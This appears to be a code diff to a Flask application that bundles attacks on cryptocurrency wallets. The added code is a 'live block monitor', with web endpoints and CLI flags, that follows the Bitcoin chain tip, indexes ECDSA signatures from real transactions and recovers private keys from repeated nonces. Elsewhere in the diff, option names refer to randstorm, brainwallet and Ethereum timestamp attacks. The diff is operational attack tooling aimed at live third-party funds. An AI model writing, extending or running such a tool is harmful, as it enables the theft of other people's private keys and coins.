+        "host": html.escape(_esplora_host(_ESPLORA_BASES[0])),
+        "window": format(LIVE_WINDOW_BLOCKS, ","),
+        "resume": html.escape(saved if saved else "tip on first run"),
+        "maxblocks": format(LIVE_MAX_BLOCKS, ","),
+        "enabled": ("live monitoring is <b>disabled</b> — set "
+                    "<code>LIVE_ENABLED=1</code>" if not LIVE_ENABLED
+                    else "LIVE_ENABLED=1 · poll %gs s (LIVE_POLL_SECS)"
+                         % LIVE_POLL_SECS),
+        "reqs": format(reqs, ","),
+        "secs": _human_secs(secs),
+        "pace": "%g" % ESPLORA_MIN_INTERVAL,
+        "avgtxs": format(LIVE_AVG_TXS, ","),
+        "lpage": LIVE_PAGE,
+        "rowsmax": format(LIVE_SIG_ROWS_MAX, ","),
+        "esplora": html.escape(_esplora_status()),
+    }
+    return page(body)
+
+
+@app.route("/api/live", methods=["POST"])
+def api_live():
+    """Start the live block monitor. Any block count is accepted."""
+    if not LIVE_ENABLED:
+        return {"ok": False, "msg": "live monitoring is disabled — start the "
+                                    "app with LIVE_ENABLED=1"}
+    j = request.get_json(silent=True) or {}
+    start_block = j.get("start_block")
+    if start_block in ("", None):
+        start_block = None
+    else:
+        try:
+            start_block = int(start_block)
+        except (TypeError, ValueError):
+            return {"ok": False, "msg": "start height must be an integer"}
+        if start_block < 0:
+            return {"ok": False, "msg": "start height cannot be negative"}
+    max_blocks = j.get("max_blocks")
+    if max_blocks in ("", None):
+        max_blocks = LIVE_MAX_BLOCKS
+    else:
+        try:
+            max_blocks = int(max_blocks)
+        except (TypeError, ValueError):
+            return {"ok": False, "msg": "blocks per run must be an integer"}
+        if max_blocks < 1:
+            return {"ok": False, "msg": "blocks per run must be at least 1"}
+    follow = bool(j.get("follow", True))
+    ok, msg = _start_job("live", attack_live_blocks, start_block, follow,
+                         max_blocks)
+    if ok:
+        per, reqs, secs = _live_estimate(max_blocks)
+        where = ("resuming from the persisted height" if start_block is None
+                 else "from block %s" % format(start_block, ","))
+        msg = ("live monitor started %s — %s block(s), ≈%s requests, ≈%s at "
+               "%s s pacing (%s tx/block assumed); Stop keeps the index and the "
+               "last height" % (where, format(max_blocks, ","), format(reqs, ","),
+                                _human_secs(secs), "%g" % ESPLORA_MIN_INTERVAL,
+                                format(LIVE_AVG_TXS, ",")))
+    return {"ok": ok, "msg": msg, "start_block": start_block,
+            "max_blocks": max_blocks, "follow": follow}
+
+
+@app.route("/api/live/status")
+def api_live_status():
+    """Index state without touching the network — the page polls this."""
+    saved = live_state_get("last_height", "")
+    try:
+        last = int(saved) if saved else None
+    except ValueError:
+        last = None
+    return {"ok": True, "index": live_stats(), "last_height": last,
+            "window_blocks": LIVE_WINDOW_BLOCKS, "max_blocks": LIVE_MAX_BLOCKS,
+            "page_size": LIVE_PAGE, "poll_secs": LIVE_POLL_SECS,
+            "enabled": LIVE_ENABLED, "tip": None,
+            "esplora": _esplora_status()}
+
+
+@app.route("/api/live/ping", methods=["POST", "GET"])
+def api_live_ping():
+    """Explicitly probe the chain tip (a status poll must not hit the network)."""
+    tip = _live_tip_height()
+    saved = live_state_get("last_height", "")
+    return {"ok": tip is not None,
+            "msg": ("tip is %s" % format(tip, ",") if tip is not None else
+                    "no Esplora endpoint answered /blocks/tip/height — %s"
+                    % _esplora_status()),
+            "tip": tip, "last_height": saved or None}
+
+
+@app.route("/api/live/reset", methods=["POST"])
+def api_live_reset():
+    with _JOBS_LOCK:
+        j = _JOBS.get("live")
+        if j and j.get("alive"):
+            return {"ok": False, "msg": "the live monitor is running — stop it "
+                                        "before clearing the index"}
+    before = live_stats()["sigs"]
+    live_reset()
+    return {"ok": True, "msg": "cleared %s indexed signature(s) and the "
+                               "persisted height" % format(before, ",")}
+
 
 @app.route("/results")
 def results_page():
@@ -5626,6 +7019,22 @@ if __name__ == "__main__":
                     help="default per-era steps for --cli-eth-era")
     ap.add_argument("--list-eras", action="store_true",
                     help="print the fixed era windows and exit")
+    ap.add_argument("--cli-live", action="store_true",
+                    help="headless live block monitor: follow the chain tip, "
+                         "index ECDSA signatures from legacy and segwit inputs "
+                         "and recover keys from a repeated nonce r")
+    ap.add_argument("--start-block", type=int, default=None, metavar="HEIGHT",
+                    help="first block for --cli-live (default: resume from the "
+                         "persisted height, or the tip on a first run)")
+    ap.add_argument("--blocks", type=int, default=LIVE_MAX_BLOCKS, metavar="N",
+                    help="blocks per --cli-live run (default %s = "
+                         "LIVE_MAX_BLOCKS); nothing is refused, a bigger number "
+                         "just runs longer and the next run resumes"
+                         % format(LIVE_MAX_BLOCKS, ","))
+    ap.add_argument("--no-follow", action="store_true",
+                    help="exit at the tip instead of waiting for new blocks")
+    ap.add_argument("--live-status", action="store_true",
+                    help="print the live index state (one tip request) and exit")
     ap.add_argument("--worker", choices=["randstorm", "brainwallet"],
                     help="run a single shard of an attack and exit (cluster worker mode)")
     ap.add_argument("--shard", metavar="IDX/N", help="0-based shard index / total shards, e.g. 3/10")
@@ -5711,6 +7120,51 @@ if __name__ == "__main__":
                      % (", ".join(bad), ", ".join(ETH_RECIPES)))
         attack_eth_timestamp(args.cli_eth[0], args.cli_eth[1], args.unit,
                              ids, print, job)
+        sys.exit(0)
+
+    if args.live_status:
+        st = live_stats()
+        saved = live_state_get("last_height", "")
+        tip = _live_tip_height()
+        print("live index : %s signatures, %s distinct r, %s colliding r"
+              % (format(st["sigs"], ","), format(st["distinct_r"], ","),
+                 st["colliding_r"]))
+        print("blocks     : %s..%s (window %s, cap %s rows)"
+              % (format(st["min_height"], ","), format(st["max_height"], ","),
+                 format(LIVE_WINDOW_BLOCKS, ","), format(LIVE_SIG_ROWS_MAX, ",")))
+        print("height     : persisted %s · tip %s%s"
+              % (saved or "none", format(tip, ",") if tip is not None else "unreachable",
+                 "" if tip is None or not saved
+                 else " · lag %d block(s)" % (tip - int(saved))))
+        print("endpoints  : %s" % _esplora_status())
+        sys.exit(0)
+
+    if args.cli_live:
+        if not LIVE_ENABLED:
+            sys.exit("live monitoring is disabled — set LIVE_ENABLED=1")
+        if args.blocks < 1:
+            sys.exit("--blocks must be at least 1")
+        per, reqs, secs = _live_estimate(args.blocks)
+        print("[live] %s block(s) from %s — ≈%s requests ≈ %s at %s s Esplora "
+              "pacing (≈%s tx/block assumed, %d requests per block)"
+              % (format(args.blocks, ","),
+                 format(args.start_block, ",") if args.start_block is not None
+                 else "the persisted height (tip on a first run)",
+                 format(reqs, ","), _human_secs(secs), "%g" % ESPLORA_MIN_INTERVAL,
+                 format(LIVE_AVG_TXS, ","), per))
+        print("[live] follow: %s · window %s blocks · Ctrl-C or Stop keeps the "
+              "index and the last height"
+              % ("waiting at the tip for new blocks" if not args.no_follow
+                 else "off — exits when the tip is reached",
+                 format(LIVE_WINDOW_BLOCKS, ",")))
+        job = {"stop": False, "progress": 0, "detail": ""}
+        hits = attack_live_blocks(args.start_block, not args.no_follow,
+                                  args.blocks, job=job, log=print)
+        print("[live] done — %s block(s) scanned, %s key(s) recovered, last "
+              "height persisted: %s"
+              % (format(job.get("progress", 0) * args.blocks, ",.0f")
+                 if job.get("progress") else "0",
+                 len(hits), live_state_get("last_height", "none")))
         sys.exit(0)
 
     if args.worker:
